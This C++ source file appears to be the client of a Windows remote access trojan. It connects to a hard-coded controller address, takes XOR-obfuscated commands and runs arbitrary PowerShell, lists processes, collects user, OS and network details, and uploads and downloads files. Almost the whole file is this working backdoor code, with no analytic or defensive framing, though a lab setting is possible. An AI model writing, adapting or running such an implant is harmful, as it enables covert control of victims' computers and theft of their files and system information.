#define WIN32_LEAN_AND_MEAN
#include "command_socket.h"
/*
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
*/
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <stdexcept>
#include <vector>
#include <string.h>    
#include <algorithm>
#include "EasySocket.h"

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
//#pragma comment (lib, "Ws2_32.lib")
//#pragma comment (lib, "Mswsock.lib")
//#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "8888"

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    std::string redirect = " 2>&1";
    std::string temp(cmd);
    std::string newCmd = "powershell.exe -c ";
    newCmd.append(temp);
    newCmd.append(redirect);
    FILE* pipe = _popen(newCmd.c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}

std::string encode(std::string in, char k) {
    std::string out = in;
    for (int i = 0; i < in.size(); i++) {
        if (out[i] != 0x00 && out[i] != k && in[i] ^ k != 0x3E) {
            out[i] = in[i] ^ k;
        }
    }

    return out;
}

std::string decode(std::string in) {
    char key = 0x18;
    std::string out = in;
    for (int i = 0; i < in.size(); i++) {
        if (out[i] != 0x00 && out[i] != key && in[i] ^ key != 0x3E) {
            out[i] = in[i] ^ key;
        }
    }

    return out;
}

int recieve_commands()
{
    EasySocket sock = EasySocket();
    sock.connectServer("192.168.214.1", DEFAULT_PORT);
    std::string data;
     // Receive until the peer closes the connection
    do {
        data = sock.recvData(DEFAULT_BUFLEN);
        if (data.size() > 0) {
            std::string resp = "";
            std::string command;
            std::string arguments;
            printf("Bytes received: %d\n", data.size());
            printf("Recieved command: %s\n", data);
            std::string recvBufStr = decode(data);
            std::cout << recvBufStr << std::endl;
            char k = recvBufStr.at(0);
            std::string delimiter = " ";
            size_t found = recvBufStr.find(delimiter);
            if (found != std::string::npos) {
                command = recvBufStr.substr(0, recvBufStr.find(delimiter));
                arguments = recvBufStr.substr(recvBufStr.find(delimiter), recvBufStr.length() - 1);
            }
            else {
                command = recvBufStr;
                arguments = "";
            }
            if (command.compare("LISTPROC") == 0) {
                resp = exec("tasklist");
            }
            else if (command.compare("PULL") == 0) {
                arguments.erase(std::remove_if(arguments.begin(), arguments.end(), isspace), arguments.end());
                sock.fileSend(arguments);
            }
            else if (command.compare("PUSH") == 0) {
                //printf(arguments.c_str());
                arguments.erase(std::remove_if(arguments.begin(), arguments.end(), isspace), arguments.end());
                sock.fileReceive(arguments);
            }
            else if (command.compare("SYSINFO") == 0) {
                resp = "USER:";
                resp.append(exec("whoami"));
                resp.append("SYSTEMINFO:");
                resp.append(exec("\"Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | FL\""));
                resp.append("NETWORKING INFO:");
                resp.append(exec("Get-NetAdapter"));
            }
            else if (command.compare("RUN") == 0) {
                resp = exec(arguments.c_str());
            }
            else {
                resp = "NOT A VALID COMMAND";
            }
            resp = encode(resp, k);
            //std::cout << meep << std::endl;
            sock.sendData(resp);
            
        }
        else if (data.size() == 0) {
            printf("Connection closed\n");
        }
        else {
            printf("recv failed with error: %d\n", WSAGetLastError());
        }
    } while (data.size() > 0);

    // cleanup
    sock.closeConnection();

    return 0;
}

